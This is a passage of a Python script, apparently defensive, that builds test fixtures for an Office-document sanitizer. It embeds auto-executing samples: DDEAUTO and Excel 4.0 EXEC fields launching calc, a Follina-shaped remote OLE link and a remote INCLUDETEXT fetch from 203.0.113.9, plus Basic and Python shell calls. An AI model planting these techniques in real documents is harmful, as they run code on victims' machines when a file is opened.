#!/usr/bin/env python3
# Rebuilds test/fixtures. Needs LibreOffice (soffice), Python 3 and Info-ZIP zip:
#
#   python3 -I scripts/make-fixtures.py
#   python3 -I scripts/make-fixtures.py cases    # cases/ alone, which needs only Python
#
# lo/     LibreOffice exports of the flat ODF sources below, as LibreOffice writes them.
# docs/   LibreOffice exports with macros, fields, relationships, objects and controls added with zipfile, and
#         packages LibreOffice cannot write (Visio, .xlam, .odb), built by hand.
# zip/    Archives built byte by byte to break one rule of the ZIP format each.
# cases/  One package for each behavior the corpus census found. A rebuild writes the same bytes.
#         manifest.json, kept by hand, says what each file stands in for and what office-defuse reports.
#
# LibreOffice stamps dates into what it writes, so a rebuild of lo/ and docs/ changes bytes but not what the tests
# check.
import io
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(ROOT, 'test', 'fixtures')
TMP = tempfile.mkdtemp(prefix='office-defuse-fixtures-')

# A compound file header and nothing else. office-defuse only checks the signature; ole-defuse reads inside.
FAKE_OLE = bytes.fromhex('d0cf11e0a1b11ae1') + bytes(504)

W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
RT = R + '/'
MSR = 'http://schemas.microsoft.com/office/2006/relationships/'

NS_ODF = (
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
    'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
    'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
    'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" '
    'xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" '
    'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" '
    'xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
)

SOURCES = {
    'doc.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:h text:outline-level="1">Fixture</text:h>
  <text:p>A plain document with a <text:a xlink:type="simple" xlink:href="https://example.com/about">web link</text:a> and a <text:a xlink:type="simple" xlink:href="mailto:someone@example.com">mail link</text:a>.</text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'sheet.fods': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:body><office:spreadsheet><table:table table:name="Sheet1">
  <table:table-row><table:table-cell office:value-type="float" office:value="2"><text:p>2</text:p></table:table-cell><table:table-cell office:value-type="float" office:value="3"><text:p>3</text:p></table:table-cell><table:table-cell table:formula="of:=SUM([.A1:.B1])" office:value-type="float" office:value="5"><text:p>5</text:p></table:table-cell></table:table-row>
 </table:table></office:spreadsheet></office:body>
</office:document>
''' % NS_ODF,
    'pres.fodp': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.presentation">
 <office:body><office:presentation>
  <draw:page draw:name="page1"><draw:frame svg:x="2cm" svg:y="2cm" svg:width="12cm" svg:height="3cm"><draw:text-box><text:p>Slide one, <text:a xlink:type="simple" xlink:href="https://example.com/">a link</text:a></text:p></draw:text-box></draw:frame></draw:page>
 </office:presentation></office:body>
</office:document>
''' % NS_ODF,
    'draw.fodg': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.graphics">
 <office:body><office:drawing>
  <draw:page draw:name="page1"><draw:rect svg:x="2cm" svg:y="2cm" svg:width="4cm" svg:height="3cm"><text:p>Box</text:p></draw:rect></draw:page>
 </office:drawing></office:body>
</office:document>
''' % NS_ODF,
    'formula.mml': '''<?xml version="1.0" encoding="UTF-8"?>
<math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>a</mi><mo>+</mo><mi>b</mi></mrow></math>
''',
    'links.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:p><text:a xlink:type="simple" xlink:href="https://example.com/page">web</text:a>, <text:a xlink:type="simple" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document">macro</text:a>, <text:a xlink:type="simple" xlink:href="http://192.168.10.20/login">raw address</text:a>, <text:a xlink:type="simple" xlink:href="https://user@example.com/">credentials</text:a>.</text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'dde.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:dde-connection-decls><text:dde-connection-decl office:name="calc" office:dde-application="cmd" office:dde-topic="/c calc" office:dde-item="x" office:automatic-update="true"/></text:dde-connection-decls>
  <text:p>DDE: <text:dde-connection text:connection-name="calc">value</text:dde-connection></text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'dde.fods': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:body><office:spreadsheet><table:table table:name="Sheet1">
  <table:table-row><table:table-cell table:formula="of:=DDE(&quot;cmd&quot;;&quot;/c calc&quot;;&quot;x&quot;)"><text:p>0</text:p></table:table-cell><table:table-cell table:formula="of:=&quot;DDE(&quot;&amp;&quot;text&quot;"><text:p>DDE(text</text:p></table:table-cell></table:table-row>
 </table:table></office:spreadsheet></office:body>
</office:document>
''' % NS_ODF,
}

# (source, output name, conversion target)
EXPORTS = [
    ('doc.fodt', 'clean.docx', 'docx'),
    ('doc.fodt', 'clean.docm', 'docm'),
    ('doc.fodt', 'clean.dotx', 'dotx'),
    ('doc.fodt', 'clean.odt', 'odt'),
    ('doc.fodt', 'clean.ott', 'ott'),
    ('sheet.fods', 'clean.xlsx', 'xlsx'),
    ('sheet.fods', 'clean.xltx', 'xltx'),
    ('sheet.fods', 'clean.ods', 'ods'),
    ('sheet.fods', 'clean.ots', 'ots'),
    ('pres.fodp', 'clean.pptx', 'pptx'),
    ('pres.fodp', 'clean.potx', 'potx'),
    ('pres.fodp', 'clean.odp', 'odp'),
    ('pres.fodp', 'clean.otp', 'otp'),
    ('draw.fodg', 'clean.odg', 'odg'),
    ('draw.fodg', 'clean.otg', 'otg'),
    ('formula.mml', 'clean.odf', 'odf'),
    ('links.fodt', 'links.docx', 'docx'),
    ('links.fodt', 'links.odt', 'odt'),
    ('dde.fodt', 'dde.odt', 'odt'),
    ('dde.fods', 'dde.ods', 'ods'),
]


def out(*parts):
    path = os.path.join(OUT, *parts)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    return path


def soffice_exports():
    src = os.path.join(TMP, 'src')
    os.makedirs(src)
    for name, text in SOURCES.items():
        with open(os.path.join(src, name), 'w', encoding='ascii') as f:
            f.write(text)
    profile = 'file://' + os.path.join(TMP, 'profile')
    for source, name, target in EXPORTS:
        work = os.path.join(TMP, 'convert', name)
        os.makedirs(work)
        subprocess.run(
            ['soffice', '-env:UserInstallation=' + profile, '--headless', '--convert-to', target, '--outdir', work, os.path.join(src, source)],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180,
        )
        produced = [f for f in os.listdir(work) if f.endswith('.' + target)]
        if len(produced) != 1:
            sys.exit('soffice made no %s from %s' % (target, source))
        shutil.copyfile(os.path.join(work, produced[0]), out('lo', name))


def read_zip(path):
    with zipfile.ZipFile(path) as z:
        return [(i, z.read(i.filename)) for i in z.infolist()]


def zip_bytes(items):
    """(ZipInfo or name, bytes) pairs in order, as a ZIP archive. ODF's mimetype goes in stored, the rest deflated."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for info, data in items:
            name = info.filename if isinstance(info, zipfile.ZipInfo) else info
            method = zipfile.ZIP_STORED if name == 'mimetype' else zipfile.ZIP_DEFLATED
            zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            zi.compress_type = method
            z.writestr(zi, data)
    return buf.getvalue()


def write_zip(path, items):
    with open(path, 'wb') as f:
        f.write(zip_bytes(items))


def edit(src, dst, replace=None, add=None, insert=None):
    """Copies a package. `replace` maps names to new bytes, `add` appends (name, bytes) entries, and `insert` maps a
    name to (marker, text) pairs: text goes in before the last occurrence of marker."""
    replace = replace or {}
    insert = insert or {}
    items = []
    for info, data in read_zip(src):
        name = info.filename
        if name in replace:
            data = replace[name]
        for marker, text in insert.get(name, []):
            s = data.decode('utf-8')
            at = s.rindex(marker)
            data = (s[:at] + text + s[at:]).encode('utf-8')
        items.append((name, data))
    names = {n for n, _ in items}
    for name, data in add or []:
        if name in names:
            sys.exit('%s already has %s' % (src, name))
        items.append((name, data))
    write_zip(dst, items)


def ct_override(part, ctype):
    return '<Override PartName="/%s" ContentType="%s"/>' % (part, ctype)


def rel(rid, rtype, target, external=False):
    return '<Relationship Id="%s" Type="%s" Target="%s"%s/>' % (rid, rtype, target, ' TargetMode="External"' if external else '')


def rels(*items):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>' % ''.join(items)).encode()


def word_document(body):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:w="%s" xmlns:r="%s" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml"><w:body>%s<w:sectPr/></w:body></w:document>' % (W, R, body)).encode()


def run(text):
    return '<w:r><w:t xml:space="preserve">%s</w:t></w:r>' % text


def complex_field(*instr, result='result'):
    """A field written the way Word writes most fields: begin, instruction runs, separate, result, end."""
    runs = ''.join('<w:r><w:instrText xml:space="preserve">%s</w:instrText></w:r>' % i for i in instr)
    return '<w:r><w:fldChar w:fldCharType="begin"/></w:r>%s<w:r><w:fldChar w:fldCharType="separate"/></w:r>%s<w:r><w:fldChar w:fldCharType="end"/></w:r>' % (runs, run(result))


def with_r(xml):
    """Declares the relationships prefix on a Word part's root, which LibreOffice leaves out when it has no use for it."""
    s = xml.decode() if isinstance(xml, bytes) else xml
    root = s.index('<w:', s.index('?>'))
    head = s[root:s.index('>', root)]
    if 'xmlns:r=' not in head:
        s = s[:root] + s[root:].replace(' ', ' xmlns:r="%s" ' % R, 1)
    return s.encode()


def docs():
    lo = lambda name: out('lo', name)
    with zipfile.ZipFile(lo('clean.docx')) as z:
        settings = with_r(z.read('word/settings.xml'))
    # Word: VBA project with its vbaData part, the way Word stores a .docm's macros.
    edit(lo('clean.docm'), out('docs', 'vba.docm'),
         insert={'[Content_Types].xml': [('</Types>', ct_override('word/vbaProject.bin', 'application/vnd.ms-office.vbaProject') + ct_override('word/vbaData.xml', 'application/vnd.ms-word.vbaData+xml'))],
                 'word/_rels/document.xml.rels': [('</Relationships>', rel('rIdVba', MSR + 'vbaProject', 'vbaProject.bin'))]},
         add=[('word/vbaProject.bin', FAKE_OLE),
              ('word/_rels/vbaProject.bin.rels', rels(rel('rId1', MSR + 'wordVbaData', 'vbaData.xml'))),
              ('word/vbaData.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"><wne:mcds/></wne:vbaSuppData>')])

    # Word fields: DDEAUTO split over runs and hidden with a character reference, DDE in a simple field, the QUOTE
    # trick, an include from a web server, a macro button and a HYPERLINK field to a share.
    body = ''.join([
        '<w:p>%s</w:p>' % complex_field(' DD', 'E&#65;UTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" '),
        '<w:p><w:fldSimple w:instr=" DDE cmd &quot;/c notepad&quot; x">%s</w:fldSimple></w:p>' % run('simple'),
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>%s<w:r><w:instrText xml:space="preserve"> c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>%s<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>' % (complex_field(' QUOTE 68 68 69 65 85 84 79 ', result='DDEAUTO'), run('computed')),
        '<w:p>%s</w:p>' % complex_field(' INCLUDETEXT "http://203.0.113.9/payload.docx" '),
        '<w:p>%s</w:p>' % complex_field(' MACROBUTTON AutoOpen Double-click here '),
        '<w:p>%s</w:p>' % complex_field(' HYPERLINK "\\\\\\\\fileserver\\\\share\\\\notes.docx" '),
        '<w:p>%s</w:p>' % complex_field(' PAGE '),
    ])
    edit(lo('clean.docx'), out('docs', 'fields.docx'), replace={'word/document.xml': word_document(body)})

    # Word: relationships that reach outside the package. A remote template, the Follina shape of an external OLE
    # object, a remote image, a frame, a sub-document, a local template and an unknown type.
    edit(lo('clean.docx'), out('docs', 'external.docx'),
         replace={'word/settings.xml': settings},
         insert={'word/_rels/document.xml.rels': [('</Relationships>', ''.join([
             rel('rIdOle', RT + 'oleObject', 'http://203.0.113.9/exploit.html!', True),
             rel('rIdImg', RT + 'image', 'https://tracker.example.net/pixel.png', True),
             rel('rIdFrame', RT + 'frame', 'https://example.net/frame.html', True),
             rel('rIdSub', RT + 'subDocument', '\\\\fileserver\\docs\\chapter.docx', True),
             rel('rIdOdd', 'http://example.com/relationships/unknown', 'https://example.net/odd', True),
         ]))],
                 'word/settings.xml': [('</w:settings>', '<w:attachedTemplate r:id="rIdTpl"/>')]},
         add=[('word/_rels/settings.xml.rels', rels(rel('rIdTpl', RT + 'attachedTemplate', 'https://templates.example.net/report.dotm', True)))])
    edit(lo('clean.docx'), out('docs', 'local-template.docx'),
         replace={'word/settings.xml': settings},
         insert={'word/settings.xml': [('</w:settings>', '<w:attachedTemplate r:id="rIdTpl"/>')]},
         add=[('word/_rels/settings.xml.rels', rels(rel('rIdTpl', RT + 'attachedTemplate', 'file:///C:/Users/someone/Templates/Report.dotx', True)))])

    # Word: an embedded OLE object, an embedded workbook, an OLE file behind an image relationship, and an ActiveX
    # control with its binary.
    ole_body = '<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1" r:id="rIdOle"/></w:object></w:r><w:r><w:control r:id="rIdCtl" w:name="CommandButton1"/></w:r></w:p>'
    edit(lo('clean.docx'), out('docs', 'objects.docx'),
         replace={'word/document.xml': word_document(ole_body)},
         insert={'[Content_Types].xml': [('</Types>', ''.join([
             ct_override('word/embeddings/oleObject1.bin', 'application/vnd.openxmlformats-officedocument.oleObject'),
             ct_override('word/embeddings/Book1.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
             ct_override('word/media/image1.png', 'image/png'),
             ct_override('word/activeX/activeX1.xml', 'application/vnd.ms-office.activeX+xml'),
             ct_override('word/activeX/activeX1.bin', 'application/vnd.ms-office.activeX'),
         ]))],
                 'word/_rels/document.xml.rels': [('</Relationships>', ''.join([
                     rel('rIdOle', RT + 'oleObject', 'embeddings/oleObject1.bin'),
                     rel('rIdPkg', RT + 'package', 'embeddings/Book1.xlsx'),
                     rel('rIdImg', RT + 'image', 'media/image1.png'),
                     rel('rIdCtl', RT + 'control', 'activeX/activeX1.xml'),
                 ]))]},
         add=[('word/embeddings/oleObject1.bin', FAKE_OLE),
              ('word/embeddings/Book1.xlsx', open(lo('clean.xlsx'), 'rb').read()),
              ('word/media/image1.png', FAKE_OLE),
              ('word/activeX/activeX1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n<ax:ocx ax:classid="{D7053240-CE69-11CD-A777-00DD01143C57}" ax:persistence="persistStorage" r:id="rId1" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'),
              ('word/activeX/_rels/activeX1.xml.rels', rels(rel('rId1', MSR + 'activeXControlBinary', 'activeX1.bin'))),
              ('word/activeX/activeX1.bin', FAKE_OLE)])

    # Word: a ribbon that calls macros.
    edit(lo('clean.docm'), out('docs', 'customui.docm'),
         insert={'_rels/.rels': [('</Relationships>', rel('rIdUi', 'http://schemas.microsoft.com/office/2007/relationships/ui/extensibility', 'customUI/customUI14.xml'))]},
         add=[('customUI/customUI14.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<customUI xmlns="http://schemas.microsoft.com/office/2009/07/customui" onLoad="RibbonLoaded"><ribbon><tabs><tab id="t1" label="Tools"><group id="g1" label="Run"><button id="b1" label="Go" onAction="DoIt"/><button idMso="Copy"/></group></tab></tabs></ribbon></customUI>')])

    # PowerPoint: action settings that run a program, run a macro and activate an object.
    with zipfile.ZipFile(lo('clean.pptx')) as z:
        slide = z.read('ppt/slides/slide1.xml').decode()
    slide = slide.replace('<p:cNvPr id="2"', '<p:cNvPr id="2"', 1)
    marker = '<p:cNvPr '
    at = slide.index(marker)
    close = slide.index('>', at)
    actions = '<a:hlinkClick r:id="rIdRun" action="ppaction://program"/><a:hlinkHover r:id="" action="ppaction://macro?name=Module1.Show"/>'
    if slide[close - 1] == '/':
        slide = slide[:close - 1] + '>' + actions + '</p:cNvPr>' + slide[close + 1:]
    else:
        slide = slide[:close + 1] + actions + slide[close + 1:]
    edit(lo('clean.pptx'), out('docs', 'actions.pptx'),
         replace={'ppt/slides/slide1.xml': slide.encode()},
         insert={'ppt/slides/_rels/slide1.xml.rels': [('</Relationships>', rel('rIdRun', RT + 'hyperlink', 'file:///C:/Windows/System32/calc.exe', True))]})

    # Excel: a DDE link, a DDE formula, a remote workbook link, an Excel 4.0 macro sheet with Auto_Open, a shape
    # that runs a macro and a form control's VML macro.
    with zipfile.ZipFile(lo('clean.xlsx')) as z:
        sheet = z.read('xl/worksheets/sheet1.xml').decode()
        workbook = z.read('xl/workbook.xml').decode()
    sheet = sheet.replace('</sheetData>', '<row r="5"><c r="A5"><f>cmd|\' /c calc\'!A0</f><v>0</v></c><c r="B5" t="str"><f>"a|b"&amp;\'x|y\'!A1</f><v>a|b</v></c></row></sheetData>', 1)
    sheet = sheet.replace('</worksheet>', '<drawing r:id="rIdDr"/><legacyDrawing r:id="rIdVml"/></worksheet>')
    if 'xmlns:r=' not in sheet.split('>', 2)[1]:
        sheet = sheet.replace('<worksheet ', '<worksheet xmlns:r="%s" ' % R, 1)
    workbook = workbook.replace('</sheets>', '<sheet name="Macro1" sheetId="9" state="hidden" r:id="rIdXlm"/></sheets><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>', 1)
    workbook = workbook.replace('<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames><definedNames>', '<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName>')
    staged = os.path.join(TMP, 'excel.xlsx')
    edit(lo('clean.xlsx'), staged,
         replace={'xl/worksheets/sheet1.xml': sheet.encode(), 'xl/workbook.xml': workbook.encode()},
         insert={'[Content_Types].xml': [('</Types>', ''.join([
             ct_override('xl/externalLinks/externalLink1.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml'),
             ct_override('xl/externalLinks/externalLink2.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml'),
             ct_override('xl/macrosheets/sheet1.xml', 'application/vnd.ms-excel.macrosheet+xml'),
             ct_override('xl/drawings/drawing1.xml', 'application/vnd.openxmlformats-officedocument.drawing+xml'),
             ct_override('xl/drawings/vmlDrawing1.vml', 'application/vnd.openxmlformats-officedocument.vmlDrawing'),
         ]))],
                 'xl/_rels/workbook.xml.rels': [('</Relationships>', ''.join([
                     rel('rIdExt1', RT + 'externalLink', 'externalLinks/externalLink1.xml'),
                     rel('rIdExt2', RT + 'externalLink', 'externalLinks/externalLink2.xml'),
                     rel('rIdXlm', MSR + 'xlMacrosheet', 'macrosheets/sheet1.xml'),
                 ]))]},
         add=[('xl/externalLinks/externalLink1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic=" /c calc"><ddeItems><ddeItem name="A0" advise="1"/></ddeItems></ddeLink></externalLink>'),
              ('xl/externalLinks/externalLink2.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="%s"><externalBook r:id="rId1"/></externalLink>' % R).encode()),
              ('xl/externalLinks/_rels/externalLink2.xml.rels', rels(rel('rId1', RT + 'externalLinkPath', 'https://files.example.net/prices.xlsx', True))),
              ('xl/macrosheets/sheet1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>EXEC("calc.exe")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></xm:macrosheet>'),
              ('xl/worksheets/_rels/sheet1.xml.rels', rels(rel('rIdDr', RT + 'drawing', '../drawings/drawing1.xml'), rel('rIdVml', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml'))),
              ('xl/drawings/drawing1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><xdr:twoCellAnchor><xdr:from><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>3</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>3</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to><xdr:sp macro="[0]!Module1.Run" textlink=""><xdr:nvSpPr><xdr:cNvPr id="2" name="Button"/><xdr:cNvSpPr/></xdr:nvSpPr><xdr:spPr/></xdr:sp><xdr:clientData/></xdr:twoCellAnchor></xdr:wsDr>'),
              ('xl/drawings/vmlDrawing1.vml', b'<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel"><v:shape id="_x0000_s1025" type="#_x0000_t201"><x:ClientData ObjectType="Button"><x:Anchor>1, 0, 1, 0, 3, 0, 3, 0</x:Anchor><x:FmlaMacro>[0]!Module1.Click</x:FmlaMacro></x:ClientData></v:shape></xml>')])
    retype(staged, out('docs', 'excel.xlsm'), 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml', 'application/vnd.ms-excel.sheet.macroEnabled.main+xml')

    # OpenDocument: Basic, dialogs and scripts folders, an on-open event, a LibreLogo mouse-over event, menus.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        content = z.read('content.xml').decode()
        manifest = z.read('META-INF/manifest.xml').decode()
    content = content.replace('<office:scripts/>', '<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:type="simple" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts>', 1)
    content = content.replace('</text:a>', '<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:type="simple" xlink:href="vnd.sun.star.script:LibreLogo|LibreLogo.py$run?language=Python&amp;location=share"/></office:event-listeners></text:a>', 1)
    basic_lc = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">\n<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">\n <library:library library:name="Standard" library:link="false"/>\n</library:libraries>'
    basic_lb = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">\n<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">\n <library:element library:name="Module1"/>\n</library:library>'
    basic_mod = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub Main\n  Shell("calc")\nEnd Sub\n</script:module>'
    dialog = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE dlg:window PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "dialog.dtd">\n<dlg:window xmlns:dlg="http://openoffice.org/2000/dialog" xmlns:script="http://openoffice.org/2000/script" dlg:id="Dialog1" dlg:left="0" dlg:top="0" dlg:width="100" dlg:height="50"/>'
    menubar = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE menu:menubar PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "menubar.dtd">\n<menu:menubar xmlns:menu="http://openoffice.org/2001/menu" menu:id="menubar"><menu:menu menu:id=".uno:PickList"/></menu:menubar>'
    listed = ''.join('<manifest:file-entry manifest:full-path="%s" manifest:media-type="%s"/>' % e for e in [
        ('Basic/script-lc.xml', 'text/xml'), ('Basic/Standard/script-lb.xml', 'text/xml'), ('Basic/Standard/Module1.xml', 'text/xml'),
        ('Dialogs/Standard/Dialog1.xml', 'text/xml'), ('Scripts/python/tool.py', ''), ('Configurations2/menubar/menubar.xml', 'text/xml'),
    ])
    edit(lo('clean.odt'), out('docs', 'macros.odt'),
         replace={'content.xml': content.encode(), 'META-INF/manifest.xml': manifest.replace('</manifest:manifest>', listed + '</manifest:manifest>').encode()},
         add=[('Basic/script-lc.xml', basic_lc), ('Basic/Standard/script-lb.xml', basic_lb), ('Basic/Standard/Module1.xml', basic_mod),
              ('Dialogs/Standard/Dialog1.xml', dialog), ('Scripts/python/tool.py', b'import os\nos.system("calc")\n'),
              ('Configurations2/menubar/menubar.xml', menubar)])

    # OpenDocument presentation: an OLE object stored in the package, an applet, a plug-in, a floating frame from
    # outside, and click actions that run a program and an object verb.
    with zipfile.ZipFile(lo('clean.odp')) as z:
        content = z.read('content.xml').decode()
        manifest = z.read('META-INF/manifest.xml').decode()
    shapes = ''.join([
        '<draw:frame svg:x="1cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:object-ole draw:class-id="00020906-0000-0000-C000-000000000046" xlink:href="./Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>',
        '<draw:frame svg:x="6cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:applet draw:code="Evil.class" xlink:href="http://203.0.113.9/applets/" xlink:type="simple"/></draw:frame>',
        '<draw:frame svg:x="11cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:plugin draw:mime-type="application/x-shockwave-flash" xlink:href="http://203.0.113.9/movie.swf" xlink:type="simple"/></draw:frame>',
        '<draw:frame svg:x="16cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:floating-frame xlink:href="https://example.net/frame.html" xlink:type="simple"/></draw:frame>',
        '<draw:rect svg:x="1cm" svg:y="10cm" svg:width="4cm" svg:height="2cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="execute" xlink:href="file:///C:/Windows/System32/calc.exe" xlink:type="simple"/></office:event-listeners><text:p>Run</text:p></draw:rect>',
        '<draw:rect svg:x="6cm" svg:y="10cm" svg:width="4cm" svg:height="2cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="verb" presentation:verb="0"/></office:event-listeners><text:p>Open</text:p></draw:rect>',
    ])
    page_end = content.index('</draw:page>')
    content = content[:page_end] + shapes + content[page_end:]
    for prefix, uri in [('presentation', 'urn:oasis:names:tc:opendocument:xmlns:presentation:1.0'), ('script', 'urn:oasis:names:tc:opendocument:xmlns:script:1.0'), ('xlink', 'http://www.w3.org/1999/xlink')]:
        if 'xmlns:%s=' % prefix not in content:
            content = content.replace('<office:document-content ', '<office:document-content xmlns:%s="%s" ' % (prefix, uri), 1)
    listed = '<manifest:file-entry manifest:full-path="Object 1" manifest:media-type="application/vnd.sun.star.oleobject"/><manifest:file-entry manifest:full-path="ObjectReplacements/Object 1" manifest:media-type="application/x-openoffice-gdimetafile;windows_formatname=&quot;GDIMetaFile&quot;"/><manifest:file-entry manifest:full-path="Pictures/stray.bin" manifest:media-type=""/>'
    edit(lo('clean.odp'), out('docs', 'objects.odp'),
         replace={'content.xml': content.encode(), 'META-INF/manifest.xml': manifest.replace('</manifest:manifest>', listed + '</manifest:manifest>').encode()},
         add=[('Object 1', FAKE_OLE), ('ObjectReplacements/Object 1', b'not an image'), ('Pictures/stray.bin', FAKE_OLE)])

    # OpenDocument: references that load from outside on their own.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        meta = z.read('meta.xml').decode()
        content = z.read('content.xml').decode()
    meta = meta.replace('</office:meta>', '<meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Report" xlink:href="https://templates.example.net/report.ott"/><meta:auto-reload xlink:href="https://example.net/next.odt" meta:delay="PT5S"/></office:meta>', 1)
    if 'xmlns:xlink=' not in meta:
